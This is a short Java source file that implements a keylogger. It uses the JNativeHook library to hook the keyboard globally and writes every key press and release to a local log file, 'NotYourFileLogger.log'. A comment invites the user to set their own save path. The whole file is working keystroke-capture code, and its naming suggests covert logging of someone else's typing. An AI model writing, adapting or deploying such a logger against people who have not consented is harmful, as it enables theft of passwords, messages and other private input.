import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class KeyListener implements NativeKeyListener {

    protected void start() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }

        GlobalScreen.addNativeKeyListener(new KeyListener());
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
//        System.out.println("Typed: " + NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
//        System.out.println("Pressed: " + NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
        writeUsingFileWriter("Pressed: "+NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode())+"\n");
///ssssSSssSSSsssSSSss
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
//        System.out.println("Released: " + NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
        this.writeUsingFileWriter("Released: "+NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode())+"\n");
    }

    static boolean notFirstRun = false;
    private void writeUsingFileWriter(String data) {
        FileWriter fr = null;
        // TODO change sajdi to where you want save your file
        File file = new File("/Users/sajdi/NotYourFileLogger.log");
        try {
            fr = new FileWriter(file, notFirstRun);
            notFirstRun = true;
            fr.write(data);
        } catch (IOException e) {
            e.printStackTrace();
        }finally{
            try {
                fr.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
